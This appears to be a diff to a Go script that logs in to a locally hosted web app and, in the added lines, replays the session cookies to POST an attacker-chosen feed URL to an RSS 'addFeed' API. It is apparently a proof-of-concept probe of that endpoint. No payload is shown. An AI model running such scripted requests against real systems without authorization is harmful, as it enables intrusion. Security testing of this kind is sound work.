@@ -55,7 +55,7 @@ fmt.Println("PORT:", *PORT)
                 responseString := string(body)
                 substr := "user"
                 if strings.Contains(responseString, substr) {
-                        fmt.Println("The substring is present in the string.")
+                        fmt.Println("Accuring connection...")
 
                         urlx := "http://localhost:8080/api/v2/auth/login"
                         methodx := "POST"
@@ -89,6 +89,64 @@ fmt.Println("PORT:", *PORT)
                                 return
                         }
                         fmt.Println(string(bodyx))
+
+                        //midrequest
+
+
+
+
+
+
+
+
+
+
+
+
+                        urlrss := "http://localhost:8080/api/v2/rss/addFeed?l2pqj91s"
+                        methodrss := "POST"
+
+                        payloadrss := strings.NewReader("url=https%3A%2F%2Fuippppp.cem%2Fanax&path=")
+
+                        clientrss := &http.Client{}
+                        req, err := http.NewRequest(methodrss, urlrss, payloadrss)
+
+                        if err != nil {
+                                fmt.Println(err)
+                                return
+                        }
+                        //  req.Header.Add("Accept", "text/javascript, text/html, application/xml, text/xml, */*")
+                        req.Header.Add("Referer", "http://localhost:8080/")
+                        req.Header.Add("X-Requested-With", "XMLHttpRequest")
+                        req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")
+                        req.Header.Add("Content-type", "application/x-www-form-urlencoded; charset=UTF-8")
+
+                        //  req.AddCookie(cookies)
+                        for _, c := range cookie {
+                                req.AddCookie(c)
+                        }
+                        //  req.Header.Add("Cookie", cookie)
+                        res, err := clientx.Do(req)
+                        if err != nil {
+                                fmt.Println(err)
+                                return
+                        }
+                        defer res.Body.Close()
+
+                        body, err := ioutil.ReadAll(res.Body)
+                        if err != nil {
+                                fmt.Println(err)
+                                return
+                        }
+                        fmt.Println(string(body))
+
+
+
+
+
+
+
+                        //midrequest
 
                         //second req starting here ffffffffffffffffffffffffffffffffffffffffffffffffff
 
